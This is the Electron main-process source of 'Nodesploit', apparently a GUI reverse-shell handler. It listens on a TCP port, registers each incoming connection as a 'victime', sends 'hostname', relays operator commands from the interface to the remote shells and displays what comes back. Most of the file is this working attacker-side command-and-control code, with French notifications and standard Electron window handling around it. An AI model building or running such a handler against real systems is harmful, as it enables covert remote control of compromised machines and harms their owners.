import { app, ipcMain, Notification } from "electron";
import { nanoid } from "nanoid";
import { mainWindow, loadingWindow } from "./window";
import store from "@/store";

/**
 * Set `__static` path to static files in production
 * https://simulatedgreg.gitbooks.io/electron-vue/content/en/using-static-assets.html
 */
if (process.env.NODE_ENV !== "development") {
  global.__static = require("path")
    .join(__dirname, "/static")
    .replace(/\\/g, "\\\\");
}

/** @class Nodesploit */
class Nodesploit {
  /**
   * @constructor
   * @param  {BrowserWindow} mainWin
   * @param  {BrowserWindow} loadWin
   * @param  {Server} server
   * @param  {Map} sockets
   *
   */
  constructor() {
    this.mainWin = null;
    this.loadWin = null;
    this.server = null;
    this.sockets = new Map();
  }

  /**
   * Function to initalise life cycle of application.
   */
  init() {
    app.on("ready", () => {
      this.loadWin = loadingWindow();
      this.mainWin = mainWindow();

      this.mainWin.webContents.on("did-finish-load", () => {
        this.mainWin.show();
        this.loadWin.destroy();
      });

      this.mainWin.on("closed", () => {
        this.mainWin = null;
      });
    });

    app.on("window-all-closed", () => {
      if (process.platform !== "darwin") {
        app.quit();
      }
    });
  }

  /**
   * Function to create and listening on server.
   * @param  {Object} connection
   * @return {Boolean} Listening OR Not listening
   */
  createServer(connection) {
    var net = require("net");
    this.server = new net.Server();

    process.on("SIGTERM", () => {
      this.server.close();
    });

    /**
     * This events is called when server is successfully listened, See {this.server.listen()} for more detaille
     */
    this.server.on("listening", () => {
      if (store.getters.notification) {
        var notif = new Notification({
          title: "Server is ON",
          body: `Le serveur ecoute sur le port ${
            this.server.address().port
          } et l'adresse ${this.server.address().address}`,
        });

        notif.show();
      }
    });

    /**
     * This event is called when server is successfully closed
     */
    this.server.on("close", () => {
      if (store.getters.notification) {
        var notif = new Notification({
          title: "Server closed",
          body: "Le serveur n'ecoute plus sur le port",
        });
        notif.show();
      }
    });

    /**
     * @param  {Error} e
     * This events is called when error occur in server
     */
    this.server.on("error", (e) => {
      if (e.code === "EADDRINUSE") {
        console.log("Address in use, retrying...");
      }
    });

    /**
     * This events is called when a new victime is connected to server
     */
    this.server.on("connection", (socket) => {
      var alreadyExist = false;
      this.sockets.forEach((soc) => {
        if (soc.remoteAddress == socket.remoteAddress) {
          alreadyExist = true;
        }
      });
      if (alreadyExist) {
        socket.end();
      } else {
        socket.setKeepAlive(true, Infinity);
        socket.setDefaultEncoding("utf8");
        socket.id = nanoid(10);

        socket.write("hostname \n");

        this.addVictime(socket);

        socket.on("error", (e) => {
          console.log(e);
          if (e.code == "ECONNRESET") {
            console.log("Socket end shell with CTRL+C");
            console.log("DEL[ERROR]: " + socket.id);
          }
        });

        socket.on("close", () => {
          console.log("DEL[CLOSE]: " + socket.id);
          this.deleteVictime(socket.id);
        });

        socket.on("end", () => {
          console.log("DEL[END]: " + socket.id);
          this.deleteVictime(socket.id);
        });

        socket.on("timeout", () => {
          console.log("timeoiut .");
        });

        var cmd = "";
        ipcMain.on("cmd", (event, res) => {
          cmd = res.msg.trim() + "\n";
          var child = this.sockets.get(res.id);
          child.write(cmd);
        });

        socket.on("data", (data) => {
          if (cmd !== data) {
            console.log(data.toString("utf8"));
            this.mainWin.webContents.send("datarec", {
              data: data.toString("utf8"),
              id: socket.id,
            });
          }
        });
      }
    });

    /**
     * @param  {String} host
     * @param  {Number} port
     * This events is called to etablish listening in server with IP & Port
     */
    this.server.listen({ host: connection.ip, port: connection.port }, () => {
      console.log(`🔥 Server listen in ${connection.port}`);
    });

    return this.server.listening;
  }

  /**
   * Function to close current open server.
   * @return {Boolean}
   */
  closeServer() {
    if (this.server.close()) {
      return true;
    }
  }

  /**
   * Function to delete or close connection of 'x' victime.
   * @param {String} id
   */
  deleteVictime(id) {
    console.log(`i will delete this ${id}`);
    store.dispatch("REMOVE_CHILD", id);
    if (this.sockets.has(id)) {
      this.sockets.get(id).destroy();
      this.sockets.delete(id);
    }
  }

  /**
   * Function to add socket in Sockets Map()
   * @param  {Socket} socket
   */
  addVictime(socket) {
    this.sockets.set(socket.id, socket);
    store.dispatch("ADD_CHILD", { id: socket.id, ip: socket.remoteAddress });
    console.log(`[💀] New Victime: ${socket.id}`);

    if (store.getters.notification) {
      var notif = new Notification({
        title: "Nouvelles connexion !",
        body: `une nouvelles connexion entrant ${socket.remoteAddress}`,
      });
      notif.show();
    }
  }
}

var ns = new Nodesploit();

ns.init();

ipcMain.on("close-app", () => {
  app.quit();
});

ipcMain.on("maximize-app", () => {
  if (ns.mainWin.isFullScreen()) {
    ns.mainWin.setFullScreen(false);
  } else {
    ns.mainWin.setFullScreen(true);
  }
});

ipcMain.on("minimize-app", () => {
  ns.mainWin.minimize();
});

ipcMain.handle("serverlisten", (event, connection) => {
  ns.createServer(connection);
});

ipcMain.handle("server-stoplisten", () => {
  ns.closeServer();
});

ipcMain.on("delete_victime", (event, id) => {
  ns.deleteVictime(id);
});

/**
 * Auto Updater
 *
 * Uncomment the following code below and install `electron-updater` to
 * support auto updating. Code Signing with a valid certificate is required.
 * https://simulatedgreg.gitbooks.io/electron-vue/content/en/using-electron-builder.html#auto-updating
 */

/*
import { autoUpdater } from 'electron-updater'

autoUpdater.on('update-downloaded', () => {
  autoUpdater.quitAndInstall()
})

app.on('ready', () => {
  if (process.env.NODE_ENV === 'production') autoUpdater.checkForUpdates()
})
 */
